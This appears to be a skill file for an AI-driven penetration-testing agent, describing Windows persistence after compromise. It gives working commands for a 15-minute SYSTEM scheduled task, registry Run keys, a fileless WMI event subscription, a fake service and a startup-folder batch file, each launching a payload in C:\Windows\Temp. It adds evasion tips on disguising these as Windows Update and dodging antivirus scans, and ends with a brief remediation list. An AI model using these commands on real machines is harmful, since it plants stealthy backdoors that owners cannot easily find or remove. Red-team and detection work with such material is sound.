---
name: windows-persistence
description: Establishes stealth persistence on Windows systems using scheduled tasks, registry Run keys, WMI event subscriptions, service installation, and startup folder shortcuts.
skill_type: post_exploit
severity: high
tags: [persistence, windows, backdoor, schtasks, registry, wmi, service, startup]
---

# Windows 持久化

## Essential Principles
1. **计划任务 (schtasks)**: 周期执行 payload，隐蔽性中，可配置 SYSTEM 权限
2. **注册表 Run 键**: HKCU/HKLM 下添加自启动，用户登录时触发，隐蔽性高
3. **WMI 事件订阅**: 无文件攻击，通过 __EventFilter+__EventConsumer 绑定，极难检测
4. **服务安装**: sc create 安装 SYSTEM 权限服务，需管理员权限
5. **启动文件夹**: 简单可靠，复制 .bat/.ps1 到 Startup 目录

## When to Use
- 已获得 Windows 系统 shell
- 需要长期维持访问
- 目标可能重启或用户登出

## When NOT to Use
- 无命令执行能力
- 纯检测/侦察阶段
- 非 Windows 目标

## Path Selection
| 优先级 | 条件 | 路径 | 方法 |
|--------|------|------|------|
| 1 | 一般用户 | scheduled_task | schtasks /create /tn "WindowsUpdate" /sc minute /mo 15 |
| 2 | 一般用户 | registry_run | reg add HKCU/.../Run 添加自启动项 |
| 3 | SYSTEM 权限 | wmi_subscription | WMI __EventFilter + CommandLineEventConsumer 绑定 |
| 4 | 管理员 | service_install | sc create 安装 SYSTEM 级伪装服务 |
| 5 | 一般用户 | startup_folder | 复制 payload 到 Startup 目录 |
| 99 | 兜底 | llm_freeform | LLM 基于环境自由推理 |

## Key Commands
```bat
:: 计划任务
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\pentsvc.exe" /sc minute /mo 15 /f /ru SYSTEM

:: 注册表 Run (HKCU - 无需管理员)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsService" /t REG_SZ /d "C:\Windows\Temp\pentsvc.exe" /f

:: 注册表 Run (HKLM - 需要管理员)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsService" /t REG_SZ /d "C:\Windows\Temp\pentsvc.exe" /f

:: WMI 事件订阅 (无文件)
wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="LogonFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_LogonSession'"
wmic /namespace:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="LogonConsumer", CommandLineTemplate="C:\Windows\Temp\pentsvc.exe"
wmic /namespace:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name='LogonFilter'", Consumer="CommandLineEventConsumer.Name='LogonConsumer'"

:: 服务安装
sc create "WindowsUpdateSvc" binPath="C:\Windows\Temp\pentsvc.exe" start=auto DisplayName="Windows Update Service"

:: 启动文件夹
echo start /b C:\Windows\Temp\pentsvc.exe > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.bat"
```

## Evasion Notes
- 计划任务名伪装为系统任务 ("WindowsUpdate", "GoogleUpdate")
- 服务名伪装为 Windows 服务 ("WindowsUpdateSvc")
- WMI 无文件，绕过杀软文件扫描
- 启动文件夹路径使用 %APPDATA% 动态解析

## Remediation
1. 定期审计计划任务 (`schtasks /query`)
2. 监控注册表 Run 键变更
3. 启用 WMI 操作审计日志 (event 5861)
4. 限制服务创建权限，使用 AppLocker
5. 部署 EDR (端点检测与响应)
